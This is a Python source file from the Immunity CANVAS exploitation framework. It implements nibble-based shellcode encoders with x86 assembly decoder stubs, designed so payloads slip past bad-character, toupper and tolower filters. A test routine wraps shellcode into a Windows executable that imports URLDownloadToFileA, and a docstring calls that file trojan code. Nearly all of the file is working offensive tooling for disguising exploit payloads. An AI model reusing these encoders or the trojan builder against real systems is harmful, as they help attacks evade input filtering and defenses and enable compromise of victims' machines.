#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2006
#http://www.immunityinc.com/CANVAS/ for more information

"""
Immunity, Inc. 2002
nibble_encoder.py
"""

#int decoder(char *encoded,int size) {
#//simple nibble decoder
# int i;
# char *p;
#char *next;
# char dest;
# p=encoded;
# next=encoded;
# for (i=0; i<size; i++) {
    #dest=*next ^ 0x0f; //load first nibble
    #dest=dest << 4;  //top nibble
    #next=next+1; //increment our pointer to point to the next nibble
    #dest=dest + *next ^ 0x0f;  //load second nibble
    #next=next+1;
#p=p+1;
 #} //end of for loop
#
#} //end of function


import random
import sys, os
sys.path.append("..")
sys.path.append(".")

from MOSDEF import mosdef
from exploitutils import *


class nibble_encoder:
    def __init__(self):
        # generic default is Intel
        self.targetproc="Intel"
        #self.decoder=intel_nibbledecoder
        self.order=intel_order
        self.badstring=""
        #self.toint=istr2int
        return
    
    def checkfilter(self, code, binary):
        ret=True #success
        for c in self.badstring:
            if c in binary:
                ret=False #failed 
                print "Bad character 0x%2.2x  in our decoder!"%ord(c)
                offset=binary.find(c)
                print "Offset: %d"%offset
                #this will print out a metadata output for the offending
                #line...reasonably easy to figure out from here...
                stub,meta=mosdef.assembleEx(code,"X86")
                if meta:
                    for m in meta:
                        if m["offset"]>offset:
                            print "Offending line: %s"%x
                            break
                        x=m
                
        return ret 
    
    def setbadstring(self,badstring):
        self.badstring=badstring
        return

    def has_bad_char(self,astring):
        i=self.find_bad_char(astring)
        if i==-1:
            return 0
        return 1

    def find_bad_char(self,astring):
        i=0
        while i<len(astring):
            index=self.badstring.find(astring[i])
            if index!=-1:
                #print "Failed on %x at %d"%(ord(ch),index)
                return i
            i+=1
        return -1

    def encode(self,data):
        """
        Intel x86
        """
        intelnibbledecoder_code="""jmp intel_nibbledecoder_getpc
        intel_nibbledecoder_gotpc:
        """
        intelnibbledecoder_code+="""
        pop %ebx
        movl %ebx,%esi
        MOV_SIZE_2_ECX
        movl %ebx,%edi
        
        intel_nibbledecoderloop:
        movb (%ebx), %dl
        add $1,%ebx
        andb $0xf,%dl
        shl $0x4,%dl
        movb (%ebx), %al
        add $1,%ebx
        andb $0xf,%al
        or %al,%dl
        movb %dl,(%esi)
        addl $1,%esi
        loop intel_nibbledecoderloop
        call %edi
        intel_nibbledecoder_getpc:
        call intel_nibbledecoder_gotpc
        """
        if len(data) < 256:
            realcode = intelnibbledecoder_code.replace("MOV_SIZE_2_ECX", "xor %%ecx,%%ecx\nmovb $0x%x,%%cl" % len(data))
        elif len(data) < 65536:
            for newcode in ["xor %%ecx, %%ecx\nmovw $0x%x,%%cx" % len(data),
                            "xor %%ecx, %%ecx\nmovw $%d,%%cx\nneg %%cx" % -len(data)]:
                newbin = mosdef.assemble(newcode, "X86")
                ret=self.checkfilter(newcode, newbin)
                if ret:
                    #found one that worked!
                    break 
            print "Using code: %s"%newcode
            realcode = intelnibbledecoder_code.replace("MOV_SIZE_2_ECX", newcode)
        else:
            raise Exception, "Buffer to big for this encoder"
        
        if self.badstring=="":
            return data
        
        #Create our decoder
        try:
            intel_nibbledecoder = mosdef.assemble(realcode, "X86")
        except :
            print "Failed to assemble intel encoder... ?"

        #Check to see if decoder passes filter
        ret=self.checkfilter(realcode, intel_nibbledecoder)
        if not ret:
            return ""
        
        encodedshell=""
        for a in range(0,len(data)):
            d = ord(data[a])
            nibble1 = (d>>4) & 0xf
            nibble2 = d & 0xf
            n1added = nibble1 + 0x50
            encodedshell+= chr(n1added)
            n2added = nibble2 + 0x50
            encodedshell+= chr(n2added)
            
        #realcode=intelnibbledecoder_code.replace("SIZE",hex(len(encodedshell)/2))
        result=intel_nibbledecoder+encodedshell
        #DEBUG
        #result="\xcc"+result
        #print result
        return result
        
class intel_nibbleencoder(nibble_encoder):
    """
    Where it started
    """
    def __init__(self):
        nibble_encoder.__init__(self)
        self.targetproc="Intel"
        #self.decoder=intel_nibbledecoder
        self.order=intel_order
        self.toint=istr2int

class intel_nibble_utf8_encoder(nibble_encoder):
    
    def __init__(self):
        nibble_encoder.__init__(self)
        self.targetproc = "Intel"
        self.order = intel_order
        self.toint = istr2int
        self.TERM_SEQUENCE = '\xd6\x90'
        
    def encode(self, data):        
        decoder = """
        // Expects EIP in EBX
        // 68 bytes in length
        // Instead of using the length of the decoded data to determine
        // when we're finished we check for a termination byte. In this case
        // 0xd6. 
        xor %edx, %edx
        nop
        push %edx
        pop %eax
        xor $68, %al
        add %ax, %bx
        nop
        push %ebx
        pop %esi
        
        push %edx
        pop %eax
        xor $0xd6, %al
        nop
        push %eax
        pop %ecx
        
        intel_nibble_decoder_loop:
        xor %edx, %edx // Get lower 4 bits of (%ebx) into higher 4 of %dl 
        movb (%ebx), %al  
        push %ebx
        push %eax
        //imul $0x10, (%esp), %eax
        .byte 0x6B
        .byte 0x04
        .byte 0x24 
        .byte 0x10 
        
        pop %ebx
        pop %ebx
        
        push %eax
        pop %edx
        
        inc %ebx 
        
        xor %ebp, %ebp // Clear eax 
        nop
        nop
        push %ebp 
        pop %eax
        
        .byte 0xd6 // salc 
        mov (%ebx), %al // Get lower 4 bits of (%ebx) in %al
        inc %ebx
        push %ecx // store ecx while we use it
        push $0x41410f41
        pop %ecx
        andb %ch, %al
        nop
        nop
        pop %ecx
        
        or %al, %dl  
        mov %dl, (%esi)  
        inc %esi  
        
        cmpb %cl, %dl
        nop
        jnz intel_nibble_decoder_loop
        nop
        """
                
        if len(data) >= 65536:
            raise Exception("Buffer to big for this encoder")
        
        #Create our decoder
        try:
            intel_nibbledecoder = mosdef.assemble(decoder, "X86")
        except :
            raise Exception("Failed to assemble intel encoder... ?")
        
        encodedshell = self.nibbleEncodeData(data)
                    
        result = intel_nibbledecoder + encodedshell + self.nibbleEncodeData(self.TERM_SEQUENCE)
        
        return result
    
    def nibbleEncodeData(self, data):
        encodedshell=""
        for a in range(0,len(data)):
            d = ord(data[a])
            nibble1 = (d>>4) & 0xf
            nibble2 = d & 0xf
            n1added = nibble1 + 0x60
            encodedshell+= chr(n1added)
            n2added = nibble2 + 0x60
            encodedshell+= chr(n2added)
            
        return encodedshell
        
class intel_nibbleencoder_toupper(intel_nibbleencoder):
    """
    nibble decoder that passes toupper()
    """
    def __init__(self):
        intel_nibbleencoder.__init__(self)
        for i in range(ord('a'),ord('z')+1):
            #for a-z inclusive, these are badchars
            self.badstring+=chr(i)
        #the default shellcode is toupper clean.
        if self.decoder!=self.decoder.toupper():
            print "ERROR: something changed in the default decoder and it is no longer free of lower-case characters!"
        return
    
    def encode(self,data):
        ret=intel_nibbleencoder.encode(self,data)
        if ret.toupper()!=ret:
            print "Warning: final result is not toupper() clean!!"
        return ret

    
class intel_nibbleencoder_tolower(intel_nibbleencoder):
    """
    nibble decoder that passes tolower
    """
    def __init__(self):
        intel_nibbleencoder.__init__(self)
        self.decoder=intel_nibbledecoder_tolower
        for i in range(ord('A'),ord('Z')+1):
            #for A-Z inclusive, these are badchars
            self.badstring+=chr(i)
        #the default shellcode is toupper clean.
        if self.decoder!=self.decoder.tolower():
            print "ERROR: something changed in the tolower decoder and it is no longer free of lower-case characters!"
        return
    
            
#i=0
#decodedshellcode=""  
#for i in range(0, len(encodedshell), 2):
#  byte1=ord(encodedshell[i])
#  if i+1 < len(encodedshell):  
#    byte2=ord(encodedshell[i+1])
#  nb1 = (byte1<< 4) & 0xf0
#  nb2 = byte2 & 0xf
#  
#  decodedshellcode+=chr(nb1 | nb2)

def main():
    encoder=intel_nibbleencoder()
    encoder.setbadstring("ABCDEFG")
    data=encoder.encode("\xcc\xcc\xcc\xcc")
    print "Data=%s"%prettyprint(data)
    filedata=makedownloadfile(data)
    file("test_nibble.exe","wb").write(filedata)
    return

    
def makedownloadfile(shellcode):
    """Makes the trojan code file"""
    import pelib
    p = pelib.PElib()
    imports = [ ("advapi32.dll", ["RevertToSelf", "AccessCheck"]), ("urlmon.dll", ["URLDownloadToFileA", "FindMediaType" ]) ] 
    filedata = p.createPEFileBuf(shellcode, imports)
    #filedata=file("extras/testvuln1.exe","rb").read()
    #filedata+="\r\n\r\n"
    return filedata

if __name__=="__main__":
    main()

    
    



  



